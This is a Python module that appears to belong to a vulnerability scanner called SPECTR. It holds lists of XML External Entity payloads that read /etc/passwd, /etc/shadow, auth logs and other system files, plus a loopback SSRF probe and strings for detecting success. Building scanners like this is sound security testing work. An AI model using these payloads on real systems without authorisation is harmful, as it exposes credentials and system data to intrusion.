"""XML External Entity (XXE) payloads for SPECTR scanner"""

class XxePayloads:
    """Collection of XXE payloads"""

    # Basic XXE payloads
    BASIC_PAYLOADS = [
            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/group">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///proc/version">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]>
        <root>&xxe;</root>""",

            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///var/log/syslog">]>
        <root>&xxe;</root>"""
        ]
    
    PARAMETER_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe>',
        '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe>',
        '<!ENTITY xxe SYSTEM "file:///etc/passwd"><xxe>&xxe;</xxe>',
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><xxe>&xxe;</xxe>'
        ]

    @classmethod
    def get_all_payloads(cls):
        """Get all XXE payloads"""
        return cls.BASIC_PAYLOADS

    @classmethod
    def get_success_indicators(cls):
        """Get indicators that suggest successful XXE"""
        return [
            "root:x:0:0:",
            "daemon:x:",
            "127.0.0.1",
            "localhost"
        ]
